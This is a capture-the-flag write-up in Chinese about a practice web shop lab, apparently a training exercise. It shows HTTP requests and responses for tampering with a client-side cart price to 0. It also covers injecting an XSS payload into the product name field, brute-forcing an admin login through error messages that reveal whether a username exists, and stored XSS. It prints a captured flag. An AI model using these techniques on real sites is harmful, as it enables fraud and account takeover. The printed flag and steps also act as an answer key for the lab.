## 侦察与探测

访问首页
- 请求
    ```http
    GET / HTTP/1.1
    ```
- 响应
    ```http
    Set-Cookie: session=eyJjYXJ0IjpbXX0.aqKV9g.IVScN5jT99RihbmUFZkMpP9iDqo; HttpOnly; Path=/
    ```
    - 立即设置 cookie，伪 JWT 格式，第一段内容
        ```json
        {"cart":[]}
        ```

    ```html
    <a href="cart">
        0 items in cart
    </a>

    <td>
        <img src="static/kitten.jpg" width="300" height="168">
    </td>

    <td>
        <img src="static/puppy.jpg" width="300" height="168">
    </td>
    <td>
        <a href="add/0">
            Add to Cart
        </a>

    </td>

    <td>
        <a href="add/1">
            Add to Cart
        </a>

    </td>
    ```
    - 功能端点与图片

访问购物车
- 请求
    ```http
    GET /cart HTTP/2
    ```
    - 响应
        ```html
        <p><b>Total: $0</b></p>
        <form action="checkout" method="POST">
            <input type="hidden" name="cart" value="[]">
            <p><input type="submit" value="Check Out"></p>
        </form>
        ```
- 提交结账表单
    ```http
    POST /checkout HTTP/2

    cart=%5B%5D
    ```
    - URL 解码 `cart=[]`
    - 响应
        ```html
        <p><b>Total: $0</b></p>
        <i>Payments temporarily disabled</i>
        ```

使用添加商品功能
- 请求
    ```http
    GET /add/0 HTTP/1.1
    ```
    - 响应重定向
        ```http
        HTTP/2 302 Found
        Location: ../cart
        Set-Cookie: session=eyJjYXJ0IjpbMF0sIm1vZGlmaWVkIjp0cnVlfQ.aqKZfQ.5HgUIa0FmtdkxduLrGSQlmaZLOo; HttpOnly; Path=/
        ```
        - cookie 更新
            ```json
            {"cart":[0],"modified":true}
            ```

- 查看拥有商品的购物车，响应 HTML 解码后
    ```html
	<form action="checkout" method="POST">
			<input type="hidden" name="cart" value="[[0, {"name": "Kitten", "desc": "8\"x10\" color glossy photograph of a kitten.", "logo": "kitten.jpg", "price": 8.95}]]">
			<p><input type="submit" value="Check Out"></p>
		</form>
    ```
    - 格式化 value
        ```json
        [
            [0, {
                "name": "Kitten",
                "desc": "8\"x10\" color glossy photograph of a kitten.",
                "logo": "kitten.jpg",
                "price": 8.95
            }]
        ]
        ```
    - 或排除储存型 XSS
    - 隐藏商品信息返回到客户端

- 结账
    ```http
    POST /checkout HTTP/1.1
    Cookie: session=eyJjYXJ0IjpbMF0sIm1vZGlmaWVkIjp0cnVlfQ.aqKZfQ.5HgUIa0FmtdkxduLrGSQlmaZLOo

    cart=<@urlencode>[[0, {"name": "Kitten", "desc": "8\"x10\" color glossy photograph of a kitten.", "logo": "kitten.jpg", "price": 8.95}]]</@urlencode>
    ```

- 尝试修改价格
    ```http
    POST /checkout HTTP/2
    Cookie: session=eyJjYXJ0IjpbMF0sIm1vZGlmaWVkIjp0cnVlfQ.aqKZfQ.5HgUIa0FmtdkxduLrGSQlmaZLOo

    cart=<@urlencode>[[0, {"name": "Kitten", "desc": "8\"x10\" color glossy photograph of a kitten.", "logo": "kitten.jpg", "price": 0}]]</@urlencode>
    ```
    - 响应
        ```html
        <ul>

            <li>
                $0 &mdash; <b>
                    Kitten
                </b>
            </li>

        </ul>
        ^FLAG^a18c6ba2f04302930fad4115d7a610edd8b0f68f9df62d4c9dd9333f65e3317f$FLAG$
        <p>
            <b>
                Total: $0
            </b>
        </p>
        <i>
            Payments temporarily disabled
        </i>
        ```
        - name 字段回显

    - 测试 name 字段 XSS
        ```
        cart=<@urlencode>[[0, {"name": "<img src onerror=print()>", "desc": "8\"x10\" color glossy photograph of a kitten.", "logo": "kitten.jpg", "price": 0}]]</@urlencode>
        ```
        - 响应
            ```html
            <li>
                $0 &mdash; <b>
                    <img src onerror=print()>
                </b>
            </li>
            ```
        
根目录暴破
- 端点
    ```http
    GET /login HTTP/2
    ```
    - 响应
        ```html
        <h1>
            Admin Login
        </h1>

        <form method="POST">
            <p>
                Username: <input type="text" name="username">
            </p>
            <p>
                Password: <input type="password" name="password">
            </p>
            <p>
                <input type="submit" value="Log In">
            </p>
        </form>
        ```

- 使用任意凭据登录
    ```http
    POST /login HTTP/1.1

    username=wiener&password=peter
    ```
    - 响应
        ```html
        <b style="color: red">
            Invalid username
        </b>
        ```
        - 非通用错误信息，用户名暴破触点

- 暴破用户名，特异载荷 `carena`
    ```http
    POST /login HTTP/2
    
    username=carena&password=peter
    ```
    - 响应
        ```html
        <b style="color: red">
            Invalid password
        </b>
        ```

- 暴破密码，特异载荷 `maint`
    ```http
    POST /login HTTP/2

    username=carena&password=maint
    ```
    - 响应
        ```http
        HTTP/2 302 Found
        Set-Cookie: session=eyJhZG1pbiI6dHJ1ZSwiY2FydCI6WzBdLCJtb2RpZmllZCI6dHJ1ZX0.aqKrGA.erobecFwG2pN1pyx6OH2OQ90xkw; HttpOnly; Path=/
        ```
        - 解码 cookie 第一段
            ```json
            {
                "admin": true,
                "cart": [0],
                "modified": true
            }
            ```

        ```html
        <p>Name: <input type="text" name="name" value="Puppy &lt;h3&gt;Name&lt;/h3&gt;"></p>
        <p>Description: <input type="text" name="desc" value="8&#34;x10&#34; color glossy photograph of a puppy. &lt;h3&gt;Description&lt;/h3&gt;"></p>
        ```

    - 访问首页

        - 之前结账时的自反射 XSS，此处为保存型 XSS
    
    - 加入购物车
        ```html
        <tr>
            <td>
                $8.0
            </td>
            <td>
                Puppy <h3>
                    Name
        ```

        - 表单内的 JSON 被 HTML 编码

额外
- `/edit?id=1` 端点在移除 cookie 仍可访问
    - 若访问 `/edit`，将得到特异的 400 响应而不是通常的 404
    - 目标暴破时未设置包含此载荷的字典
